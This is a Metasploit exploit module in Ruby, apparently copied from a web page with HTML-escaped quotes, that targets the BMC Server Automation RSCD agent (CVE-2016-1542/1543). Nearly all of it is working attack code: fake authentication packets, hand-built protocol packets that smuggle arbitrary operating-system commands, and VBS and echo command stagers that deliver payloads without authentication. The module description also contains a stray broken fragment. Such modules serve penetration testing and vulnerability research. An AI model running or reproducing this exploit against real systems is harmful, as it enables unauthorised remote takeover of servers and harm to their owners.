# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;BMC Server Automation RSCD Agent NSH Remote &#039; \
                           &#039;Command Execution&#039;,
      &#039;Description&#039;     => %q(
        This module exploits a weak access control check in the BMC Server
        Automation RSCD agent that allows arbitrary operating system commands
        to be executed without authentication.
              with &#039;cmd /c&#039;.
      ),
      &#039;Author&#039;          =>
        [
          &#039;Olga Yanushkevich, ERNW <@yaole0>&#039;, # Vulnerability discovery
          &#039;Nicky Bloor (@NickstaDB) <nick@nickbloor.co.uk>&#039; # RCE payload and Metasploit module
        ],
      &#039;References&#039;      =>
        [
          [&#039;URL&#039;, &#039;https://insinuator.net/2016/03/bmc-bladelogic-cve-2016-1542-and-cve-2016-1543/&#039;],
          [&#039;URL&#039;, &#039;https://nickbloor.co.uk/2018/01/01/rce-with-bmc-server-automation/&#039;],
          [&#039;URL&#039;, &#039;https://nickbloor.co.uk/2018/01/08/improving-the-bmc-rscd-rce-exploit/&#039;],
          [&#039;CVE&#039;, &#039;2016-1542&#039;],
          [&#039;CVE&#039;, &#039;2016-1543&#039;]
        ],
      &#039;DisclosureDate&#039;  => &#039;Mar 16 2016&#039;,
      &#039;Privileged&#039;      => false,
      &#039;Stance&#039;          => Msf::Exploit::Stance::Aggressive,
      &#039;Platform&#039;        => %w[win linux unix],
      &#039;Targets&#039;         =>
        [
          [&#039;Automatic&#039;, {}],
          [
            &#039;Windows/VBS Stager&#039;, {
              &#039;Platform&#039; => &#039;win&#039;,
              &#039;Payload&#039; => { &#039;Space&#039; => 8100 }
            }
          ],
          [
            &#039;Unix/Linux&#039;, {
              &#039;Platform&#039; => %w[linux unix],
              &#039;Payload&#039; => { &#039;Space&#039; => 32_700 }
            }
          ],
          [
            &#039;Generic Command&#039;, {
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Platform&#039; => %w[linux unix win]
            }
          ]
        ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Payload&#039;         => {
        &#039;BadChars&#039; => "\x00\x09\x0a"
      },
      &#039;CmdStagerFlavor&#039; => %w[vbs echo])
    )

    register_options(
      [
        Opt::RPORT(4750)
      ]
    )

    deregister_options(&#039;SRVHOST&#039;, &#039;SRVPORT&#039;, &#039;SSL&#039;, &#039;SSLCert&#039;, &#039;URIPATH&#039;)
  end

  def check
    # Send agentinfo request and check result
    vprint_status(&#039;Checking for BMC with agentinfo request.&#039;)
    res = send_agentinfo_request

    # Check for successful platform detection
    if res[0] == 1
      vprint_good(&#039;BMC RSCD agent detected, platform appears to be &#039; + res[1])
      return CheckCode::Detected
    end

    # Get first four bytes of the packet which should hold the content length
    res_len = res[1] && res[1].length > 3 ? res[1][0..3].unpack(&#039;N&#039;)[0] : 0

    # Return unknown if the packet format appears correct (length field check)
    if res[1] && res[1].length - 4 == res_len
      vprint_warning(&#039;Target appears to be BMC, however an unexpected &#039; \
                     &#039;agentinfo response was returned.&#039;)
      vprint_warning(&#039;Response: &#039; + res[1])
      return CheckCode::Unknown
    end

    # Invalid response, probably not a BMC RSCD target
    vprint_error(&#039;The target does not appear to be a BMC RSCD agent.&#039;)
    vprint_error(&#039;Response: &#039; + res[1]) if res[1]
    CheckCode::Safe
  end

  def exploit
    # Do auto target selection
    target_name = target.name

    if target_name == &#039;Automatic&#039;
      # Attempt to detect the target platform
      vprint_status(&#039;Detecting remote platform for auto target selection.&#039;)
      platform = send_agentinfo_request

      # Fail if platform detection was unsuccessful
      if platform[0].zero?
        fail_with(Failure::UnexpectedReply, &#039;Unexpected response while &#039; \
                  &#039;detecting target platform.&#039;)
      end

      # Set target based on returned platform
      target_name = if platform[1].downcase.include?(&#039;windows&#039;)
                      &#039;Windows/VBS Stager&#039;
                    else
                      &#039;Unix/Linux&#039;
                    end
    end

    # Exploit based on target
    vprint_status(&#039;Generating and delivering payload.&#039;)
    if target_name == &#039;Windows/VBS Stager&#039;
      if payload.raw.start_with?(&#039;powershell&#039;, &#039;cmd&#039;)
        execute_command(payload.raw)
      else
        execute_cmdstager(flavor: :vbs, linemax: payload.space)
      end
      handler
    elsif target_name == &#039;Unix/Linux&#039;
      execute_cmdstager(flavor: :echo, linemax: payload.space)
      handler
    elsif target_name == &#039;Generic Cmd&#039;
      send_nexec_request(payload.raw, true)
    end
  end

  # Execute a command but don&#039;t print output
  def execute_command(command, opts = {})
    if opts[:flavor] == :vbs
      if command.start_with?(&#039;powershell&#039;) == false
        if command.start_with?(&#039;cmd&#039;) == false
          send_nexec_request(&#039;cmd /c &#039; + command, false)
          return
        end
      end
    end
    send_nexec_request(command, false)
  end

  # Connect to the RSCD agent and execute a command via nexec
  def send_nexec_request(command, show_output)
    # Connect and auth
    vprint_status(&#039;Connecting to RSCD agent and sending fake auth.&#039;)
    connect_to_rscd
    send_fake_nexec_auth

    # Generate and send the payload
    vprint_status(&#039;Sending command to execute.&#039;)
    sock.put(generate_cmd_pkt(command))

    # Finish the nexec request
    sock.put("\x00\x00\x00\x22\x30\x30\x30\x30\x30\x30\x31\x61\x30\x30\x30" \
             "\x30\x30\x30\x31\x32\x77\x38\x30\x3b\x34\x31\x3b\x33\x39\x30" \
             "\x35\x38\x3b\x32\x34\x38\x35\x31")
    sock.put("\x00\x00\x00\x12\x30\x30\x30\x30\x30\x30\x30\x61\x30\x30\x30" \
             "\x30\x30\x30\x30\x32\x65\x7f")
    sock.put("\x00\x00\x00\x12\x30\x30\x30\x30\x30\x30\x30\x61\x30\x30\x30" \
             "\x30\x30\x30\x30\x32\x69\x03")
    sock.put("\x00\x00\x00\x12\x30\x30\x30\x30\x30\x30\x30\x61\x30\x30\x30" \
             "\x30\x30\x30\x30\x32\x74\x31")
    sock.put("\x00\x00\x00\x1c\x30\x30\x30\x30\x30\x30\x31\x34\x30\x30\x30" \
             "\x30\x30\x30\x30\x63\x77\x38\x30\x3b\x34\x31\x3b\x38\x30\x3b" \
             "\x34\x31")
    sock.put("\x00\x00\x00\x11\x30\x30\x30\x30\x30\x30\x30\x39\x30\x30\x30" \
             "\x30\x30\x30\x30\x31\x7a")

    # Get the response from the RSCD agent and disconnect
    vprint_status(&#039;Reading response from RSCD agent.&#039;)
    res = read_cmd_output
    if show_output == true
      if res && res[0] == 1
        print_good("Output\n" + res[1])
      else
        print_warning(&#039;Command execution failed, the command may not exist.&#039;)
        vprint_warning("Output\n" + res[1])
      end
    end
    disconnect
  end

  # Attempt to retrieve RSCD agent info and return the platform string
  def send_agentinfo_request
    # Connect and send fake auth
    vprint_status(&#039;Connecting to RSCD agent and sending fake auth.&#039;)
    connect_to_rscd
    send_fake_agentinfo_auth

    # Send agentinfo request, read the response, and disconnect
    vprint_status(&#039;Requesting agent information.&#039;)
    sock.put("\x00\x00\x00\x32\x30\x30\x30\x30\x30\x30\x32\x61\x30\x30\x30" \
             "\x30\x30\x30\x31\x30\x36\x34\x3b\x30\x3b\x32\x3b\x36\x66\x37" \
             "\x3b\x38\x38\x30\x3b\x30\x30\x30\x30\x30\x30\x30\x30\x32\x34" \
             "\x31\x30\x30\x30\x30\x30\x30\x30\x30")
    res = sock.get_once
    disconnect

    # Return the platform field from the response if it looks valid
    res_len = res.length > 3 ? res[0..3].unpack(&#039;N&#039;)[0] : 0
    return [1, res.split(&#039;;&#039;)[4]] if res &&
                                     res.split(&#039;;&#039;).length > 6 &&
                                     res.length == (res_len + 4)

    # Invalid or unexpected response format, return the complete response
    [0, res]
  end

  # Connect to the target and upgrade to an encrypted connection
  def connect_to_rscd
    connect
    sock.put(&#039;TLS&#039;)
    sock.extend(Rex::Socket::SslTcp)
    sock.sslctx = OpenSSL::SSL::SSLContext.new(:SSLv23)
    sock.sslctx.verify_mode = OpenSSL::SSL::VERIFY_NONE
    sock.sslctx.options = OpenSSL::SSL::OP_ALL
    sock.sslctx.ciphers = &#039;ALL&#039;
    sock.sslsock = OpenSSL::SSL::SSLSocket.new(sock, sock.sslctx)
    sock.sslsock.connect
  end

  # Send fake agentinfo auth packet and ignore the response
  def send_fake_agentinfo_auth
    sock.put("\x00\x00\x00\x5e\x30\x30\x30\x30\x30\x30\x35\x36\x30\x30\x30" \
             "\x30\x30\x30\x31\x31\x36\x35\x3b\x30\x3b\x33\x35\x3b\x38\x38" \
             "\x30\x3b\x38\x38\x30\x3b\x30\x30\x30\x30\x30\x30\x30\x33\x35" \
             "\x30\x3b\x30\x3b\x37\x3b" + rand_text_alpha(7) + "\x3b\x39" \
             "\x3b\x61\x67\x65\x6e\x74\x69\x6e\x66\x6f\x3b\x2d\x3b\x2d\x3b" \
             "\x30\x3b\x2d\x3b\x31\x3b\x31\x3b\x37\x3b" + rand_text_alpha(7) +
             "\x3b\x55\x54\x46\x2d\x38")
    sock.get_once
  end

  # Send fake nexec auth packet and ignore the  response
  def send_fake_nexec_auth
    sock.put("\x00\x00\x00\x5a\x30\x30\x30\x30\x30\x30\x35\x32\x30\x30\x30" \
             "\x30\x30\x30\x31\x31\x36\x35\x3b\x30\x3b\x33\x31\x3b\x64\x61" \
             "\x34\x3b\x64\x61\x34\x3b\x30\x30\x30\x30\x30\x30\x30\x33\x31" \
             "\x30\x3b\x30\x3b\x37\x3b" + rand_text_alpha(7) + "\x3b\x35" \
             "\x3b\x6e\x65\x78\x65\x63\x3b\x2d\x3b\x2d\x3b\x30\x3b\x2d\x3b" \
             "\x31\x3b\x31\x3b\x37\x3b" + rand_text_alpha(7) + "\x3b\x55" \
             "\x54\x46\x2d\x38")
    sock.get_once
  end

  # Generate a payload packet
  def generate_cmd_pkt(command)
    # Encode back slashes
    pkt = command.gsub(&#039;\\&#039;, "\xc1\xdc")

    # Encode double quotes unless powershell is being used
    pkt = pkt.gsub(&#039;"&#039;, "\xc2\x68") unless pkt.start_with?(&#039;powershell&#039;)

    # Construct the body of the payload packet
    pkt = pad_number(pkt.length + 32) + "\x30\x30\x30\x30\x30\x30\x31\x30" \
          "\x62\x37\x3b\x30\x3b\x32\x3b\x63\x61\x65\x3b\x64\x61\x34\x3b\x30" +
          pad_number(pkt.length) + pkt

    # Prefix with the packet length and return
    [pkt.length].pack(&#039;N&#039;) + pkt
  end

  # Convert the given number to a hex string padded to 8 chars
  def pad_number(num)
    format(&#039;%08x&#039;, num)
  end

  # Read the command output from the server
  def read_cmd_output
    all_output = &#039;&#039;
    response_done = false

    # Read the entire response from the RSCD service
    while response_done == false
      # Read a response chunk
      chunk = sock.get_once
      next unless chunk && chunk.length > 4
      chunk_len = chunk[0..3].unpack(&#039;N&#039;)[0]
      chunk = chunk[4..chunk.length]
      chunk += sock.get_once while chunk.length < chunk_len

      # Check for the "end of output" chunk
      if chunk_len == 18 && chunk.start_with?("\x30\x30\x30\x30\x30\x30\x30" \
                                              "\x61\x30\x30\x30\x30\x30\x30" \
                                              "\x30\x32\x78")
        # Response has completed
        response_done = true
      elsif all_output == &#039;&#039;
        # Keep the first response chunk as-is
        all_output += chunk

        # If the command failed, we&#039;re done
        response_done = true unless all_output[8..15].to_i(16) != 1
      else
        # Append everything but the length fields to the output buffer
        all_output += chunk[17..chunk.length]
      end
    end

    # Return output if response indicated success
    return [1, all_output[26..all_output.length]] if
            all_output &&
            all_output.length > 26 &&
            all_output[8..15].to_i(16) == 1

    # Return nothing if there isn&#039;t enough data for error output
    return [0, &#039;&#039;] unless all_output && all_output.length > 17

    # Get the length of the error output and return the error
    err_len = all_output[8..15].to_i(16) - 1
    [0, all_output[17..17 + err_len]]
  end
end

